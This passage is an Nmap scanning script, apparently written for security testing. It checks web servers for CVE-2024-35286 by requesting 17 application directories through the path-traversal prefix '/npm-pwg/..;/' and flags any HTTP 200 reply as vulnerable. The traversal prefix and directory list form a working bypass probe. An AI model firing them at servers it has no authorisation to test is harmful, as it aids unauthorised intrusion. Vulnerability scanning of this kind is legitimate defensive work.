--[[
validate_directories.nse
Attempts to identify vulnerable directories to CVE-2024-35286 on a web server and checks for HTTP 200 responses.

Categories: vuln, discovery
Author: Lexis7
--]]

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"

description = [[
Checks for specific directories on a web server by sending crafted GET requests.
If the server responds with an HTTP 200 status code, the directory is considered vulnerable.
]]

---
-- @usage
-- nmap --script CVE-2024-35286_scan.nse -p 80,443 <target>
-- @output
--| validate_directories:
--|   Vulnerable directories found:
--|   - awcPortlet
--|   - LoginPortlet
--|_
---

author = "Lexis7"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "discovery"}

portrule = shortport.http

-- List of directories to check
local directories = {
    "awcPortlet",
    "awv",
    "axis2-AWC",
    "Bulkuserprovisioning",
    "ChangePasscodePortlet",
    "ChangePasswordPortlet",
    "ChangeSettingsPortlet",
    "LoginPortlet",
    "massat",
    "MiCollabMetting",
    "npm-admin",
    "npm-pwg",
    "portal",
    "ReconcileWizard",
    "SdsccDistributionErrors",
    "UCAProvisioningWizard",
    "usp"
}

-- Base path for the crafted GET request
local base_path = "/npm-pwg/..;/"

action = function(host, port)
    local vulnerable_dirs = {}

    for _, dir in ipairs(directories) do
        local full_path = base_path .. dir .. "/"
        stdnse.print_debug(1, "Testing URL: %s", full_path)

        -- Send the HTTP GET request
        local response = http.get(host, port, full_path)

        -- Check if the server responds with HTTP 200
        if response and response.status == 200 then
            table.insert(vulnerable_dirs, dir)
        end
    end

    -- Format output based on results
    if #vulnerable_dirs > 0 then
        return stdnse.format_output(true, "Vulnerable directories found:\n" .. table.concat(vulnerable_dirs, "\n"))
